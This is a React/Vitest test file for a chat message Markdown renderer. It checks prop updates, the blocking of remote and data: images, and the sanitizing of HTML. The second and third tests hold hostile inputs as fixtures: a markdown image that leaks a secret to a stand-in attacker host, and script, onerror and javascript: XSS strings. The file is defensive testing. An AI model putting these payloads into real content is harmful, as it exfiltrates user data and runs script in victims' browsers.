import { render, screen } from "@testing-library/react";
import { expect, test } from "vitest";

import { MessageResponse } from "./message";

test("unchanged Markdown still responds to presentation and renderer changes", () => {
  const { rerender, container } = render(<MessageResponse className="before">正文</MessageResponse>);
  rerender(
    <MessageResponse className="after" dir="rtl" components={{ p: ({ children }) => <p title="新版">{children}</p> }}>
      正文
    </MessageResponse>,
  );
  expect(container.firstElementChild?.classList.contains("after")).toBe(true);
  expect(screen.getByTitle("新版").textContent).toBe("正文");
});

test("untrusted Markdown cannot automatically request external or data images", () => {
  const { container } = render(
    <MessageResponse>
      {
        '![外部图片](https://attacker.example/leak?data=secret)\n\n<img src="https://attacker.example/raw">\n\n![内嵌](data:image/png;base64,AAAA)'
      }
    </MessageResponse>,
  );
  expect(container.querySelector('img[src^="https://attacker.example"]')).toBeNull();
  expect(container.querySelector('img[src^="data:"]')).toBeNull();
});

test("Markdown continues sanitizing executable HTML", () => {
  const { container } = render(
    <MessageResponse>
      {'<script>alert(1)</script><img src="x" onerror="alert(1)"><a href="javascript:alert(1)">危险</a>'}
    </MessageResponse>,
  );
  expect(container.querySelector("script, [onerror], [href^='javascript:']")).toBeNull();
});
